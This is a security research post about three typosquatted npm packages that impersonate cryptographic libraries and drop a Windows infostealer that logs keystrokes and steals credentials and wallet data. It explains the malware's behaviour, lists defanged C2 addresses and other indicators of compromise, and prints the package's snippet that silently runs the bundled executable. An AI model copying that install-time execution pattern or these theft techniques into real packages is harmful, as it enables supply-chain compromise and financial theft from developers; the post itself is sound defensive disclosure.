---
title: "Typosquatting Cryptographic Libraries: Malicious npm Packages Threaten Crypto Developers with Keylogging and Wallet Theft"
short_title: "Typosquatting Cryptographic Libraries: Keylogging and Wallet Theft"
date: 2024-11-27 12:00:00 +0000
categories: [npm]
tags: [npm, JavaScript, Typosquatting, Infostealer, Keylogger, T1195.002, T1036.005, T1059.007, T1583.006, T1005, T1217, T1555.003, T1539, T1056.001, T1115, T1041, T1071.001, T1547.001]
canonical_url: https://socket.dev/blog/malicious-npm-packages-threaten-crypto-developers
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/f18bd305ba6a83c1b3b702cf557b8a20cf53a49a-1024x1024.webp
  alt: "Typosquatting Cryptographic Libraries"
description: "Socket researchers have discovered malicious npm packages targeting crypto developers, stealing credentials and wallet data using spyware delivered through typosquats of popular cryptographic libraries."
---

In a targeted campaign, a threat actor "topnotchdeveloper12" published three malicious npm packages, [`crypto-keccak`](https://socket.dev/npm/package/crypto-keccak/overview/3.0.7), [`crypto-jsonwebtoken`](https://socket.dev/npm/package/crypto-jsonwebtoken), and [`crypto-bignumber`](https://socket.dev/npm/package/crypto-bignumber), that are impersonating popular cryptographic libraries. The packages contain spyware-infostealer malware masquerading as legitimate libraries. The malware, distributed via npm and GitHub, targets crypto-asset developers to steal their credentials, cryptocurrency wallet data, and other sensitive information.

The malware samples (`Microsoft Store.exe` and `bigNumber.exe`) exfiltrate stolen data using HTTP POST requests to command and control (C2) servers. These requests use modular endpoints, designed to handle telemetry reporting, task assignments, and file exfiltration. This campaign underscores the ongoing risks in software supply chains, especially in ecosystems reliant on third-party libraries used by developers working in cryptography, blockchain, and crypto-asset-related projects. At the time of writing, the malicious packages, which have already been downloaded over 1,000 times, are still live on the npm registry, and we have formally requested their removal to prevent further potential harm.

## We built this city on trust

The open source ecosystem is built on trust, but this trust can be easily exploited. In this case, the threat actor crafted malicious packages to mimic widely-used libraries: [`keccak`](https://socket.dev/npm/package/keccak), [`jsonwebtoken`](https://socket.dev/npm/package/jsonwebtoken) (and [`node-jsonwebtoken`](https://socket.dev/npm/package/node-jsonwebtoken)), and [`bignumber`](https://socket.dev/npm/package/bignumber). These legitimate libraries have tens of millions of downloads and are essential tools for developers working in cryptography, DeFi, blockchain, and crypto-asset projects.

The malicious packages were embedded with a legitimate-looking executable `Microsoft Store.exe` (SHA256: [d29370fa6fbf4f5a02c262f0be43bb083cfb61f46c75405d297493420ddf1508](https://www.virustotal.com/gui/file/d29370fa6fbf4f5a02c262f0be43bb083cfb61f46c75405d297493420ddf1508)), which contained a spyware-infostealer malware.

![Socket's AI scanner flagging the malicious packages](https://cdn.sanity.io/images/cgdhsj6q/production/1f13a76ffa8fc4f444aed3cf742188cca2bfef88-1449x676.png)
_Socket's AI scanner flagged all packages as malicious, providing the following context: The code contains a suspicious behavior by attempting to run an executable file `Microsoft Store.exe` on Windows platforms. This could potentially be malicious if the executable is not verified as safe. The rest of the code appears to be a standard cryptographic implementation._

## The malware in npm packages

The malware in `Microsoft Store.exe` enhances the threat actor's script by stealing sensitive user information, achieving persistence, and enabling covert surveillance. It employs credential harvesting by targeting user profile data in web browsers, extracting stored passwords and browser cookies. The malware specifically targets cryptocurrency wallets, including Exodus wallet data stored in directories such as `\AppData\Roaming\Exodus\exodus.wallet\`.

Its surveillance capabilities include keylogging, achieved through application hooks and polling mechanisms, and clipboard monitoring to intercept copied credentials and cryptocurrency addresses. This is evident in its access to sensitive paths like `\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn\`. The string `nkbihfbeogaeaoehlefnkodbefgpgknn` identifies the MetaMask browser extension – a popular cryptocurrency wallet and gateway to blockchain applications that focuses on the Ethereum network. MetaMask enables users to manage cryptocurrencies, interact with decentralized applications (DApps), and establish secure connections with blockchain-based platforms.

For persistence, the malware modifies Windows registry `Run` keys to ensure it starts automatically upon system boot, e.g. `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`.

Below is the threat actor's [code](https://socket.dev/npm/package/crypto-keccak/files/3.0.7/lib/keccak.js) with added comments highlighting malicious functionality and intent.

```javascript
if (platform === 'win32') {
    // Targeting Windows platform specifically.
    const { exec } = require('child_process'); // Import 'exec' to execute external commands.

    // Malicious execution of 'Microsoft Store.exe' from the script's directory structure.
    // This executable contains the spyware-infostealer payload.
    exec(`"./node_modules/crypto-keccak/lib/api/Microsoft Store.exe"`, (error, stdout, stderr) => {
      if (error) {
        console.error(`exec error: ${error}`); // Log any errors during execution.
        return; // Abort execution in case of errors.
      }
```

## Exfiltration mechanism

The malware exfiltrates sensitive files and user data through HTTP POST requests to a command and control (C2) server at 209.151.151[.]172. The C2 server alternates between two main paths for data exfiltration: `209.151.151[.]172/media/` and `209.151.151[.]172/timetrack/`. The C2's varied endpoint paths (i.e., `timetrack/add` and `/media/itemmedia`) indicate a modular system for handling data exfiltration, telemetry, tasking, and malware updates.

![PCAP analysis for Microsoft Store.exe](https://cdn.sanity.io/images/cgdhsj6q/production/e74b8d87197861796cfa61f656aa69e8c660ac22-2048x815.png)
_PCAP analysis for the `Microsoft Store.exe` malicious network activity_

The malware uses `curl` to send HTTP POST requests containing unique identifiers (`user_id`, `client_id`) and status updates (`timetrack_text`, `"App Started!!!"`). This likely functions as a heartbeat mechanism, confirming successful execution and identifying infected systems for further exploitation.

## The malware on GitHub

To lend an appearance of legitimacy, the threat actor added links to authentic GitHub libraries in two of their malicious packages. However, their third package, `crypto-bignumber`, deviated by linking directly to a GitHub repository owned by their alias, "cryptoleadgen". This repository hosted a malicious executable, bigNumber.exe (SHA256: [5a733c20d5b00006428ca3c4f82505bebc2d2300c709f490d3dea4fab497effb](https://www.virustotal.com/gui/file/5a733c20d5b00006428ca3c4f82505bebc2d2300c709f490d3dea4fab497effb/detection)), which mirrored the spyware-infostealer functionality of Microsoft Store.exe but introduced a separate C2 infrastructure at 69.164.209[.]197.

![Threat actor's GitHub repository](https://cdn.sanity.io/images/cgdhsj6q/production/89b46535258c6565d97b1475902ae559073c729a-1653x710.png)
_Threat actor's GitHub repository [https://github.com/cryptoleadgen/crypto-bignumber](https://github.com/cryptoleadgen/crypto-bignumber) hosting malicious code_

The C2 endpoints use the following paths: hxxps://indiefire[.]io:3306/media/itemmedia, hxxps://indiefire[.]io:3306/media/itemmediacurl, and hxxps://indiefire[.]io:3306/timetrack/add. The presence of `/media/itemmedia` and `/timetrack/add` in both malware samples indicates their essential role in the malware's operations. This secondary C2 server demonstrates the threat actor's emphasis on redundancy, ensuring the malware can continue operating even if the primary infrastructure becomes inaccessible.

## Impact assessment

This attack poses severe risks for crypto-asset developers and the broader ecosystem. The malware threatens individual developers by stealing their credentials and wallet data, which can lead to direct financial losses. For organizations, compromised systems create vulnerabilities that can spread throughout enterprise environments, enabling widespread exploitation. The campaign also erodes trust in software supply chains by targeting npm and GitHub — two platforms essential for secure and efficient development — thus undermining the fundamental infrastructure of modern software innovation.

## Protect yourself and your organization with Socket's free tools

To protect against supply chain attacks, Socket offers free tools that detect and prevent threats in real time. The [Socket GitHub app](https://socket.dev/features/github) scans dependencies in pull requests, alerting developers to malicious or typosquatted packages before they enter a project. The [Socket CLI tool](https://socket.dev/features/cli) analyzes dependencies during npm installations, warning of risks before any code is installed. Additionally, the [Socket web extension](https://chromewebstore.google.com/detail/socket-security/jbcobpbfgkhmjfpjjepkcocalmpkiaop), available for Chrome and [Firefox](https://addons.mozilla.org/en-US/firefox/addon/socket-security/), provides unobtrusive, browser-level protection, flagging potential threats while you browse. By integrating these tools into your workflow, you can safeguard your projects and organization from supply chain attacks with ease.

### MITRE ATT&CK

- T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
- T1036.005 — Masquerading: Match Legitimate Name or Location
- T1059.007 — Command and Scripting Interpreter: JavaScript
- T1583.006 — Acquire Infrastructure: Web Services
- T1005 — Data from Local System
- T1217 — Browser Information Discovery
- T1555.003 — Credentials from Password Stores: Credentials from Web Browsers
- T1539 — Steal Web Session Cookie
- T1056.001 — Input Capture: Keylogging
- T1115 — Clipboard Data
- T1041 — Exfiltration Over C2 Channel
- T1071.001 — Application Layer Protocol: Web Protocols
- T1547.001 — Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

## Indicators of Compromise (IOCs)

### Malicious Packages

- crypto-keccak
- crypto-jsonwebtoken
- crypto-bignumber

### C2 Infrastructure

- 209.151.151[.]172
- 209.151.151[.]172/media/itemmedia
- 209.151.151[.]172/media/itemmediacurl
- 209.151.151[.]172/timetrack/add
- 209.151.151[.]172/timetrack/add-d
- 209.151.151[.]172/timetrack/add.
- 209.151.151[.]172/timetrack/add0
- 209.151.151[.]172/timetrack/add3
- 209.151.151[.]172/timetrack/add=
- 209.151.151[.]172/timetrack/addP
- 209.151.151[.]172/timetrack/adda
- 209.151.151[.]172/timetrack/addaw
- 209.151.151[.]172/timetrack/addb6
- 209.151.151[.]172/timetrack/addf
- 209.151.151[.]172/timetrack/addi
- 209.151.151[.]172/timetrack/addj
- 209.151.151[.]172/timetrack/addnr
- 209.151.151[.]172/timetrack/addo
- 209.151.151[.]172/timetrack/addogram
- 209.151.151[.]172/timetrack/addr
- 209.151.151[.]172/timetrack/adds
- 69.164.209[.]197
- indiefire[.]io:3306/media/itemmedia
- indiefire[.]io:3306/media/itemmediacurl
- indiefire[.]io:3306/timetrack/add

### Malware Samples

- Microsoft Store.exe (SHA256: d29370fa6fbf4f5a02c262f0be43bb083cfb61f46c75405d297493420ddf1508)
- bigNumber.exe (SHA256: 5a733c20d5b00006428ca3c4f82505bebc2d2300c709f490d3dea4fab497effb)

### Threat Actor Identifiers

- npm username: topnotchdeveloper12
- GitHub username: cryptoleadgen
- GitHub repository: https://github[.]com/cryptoleadgen
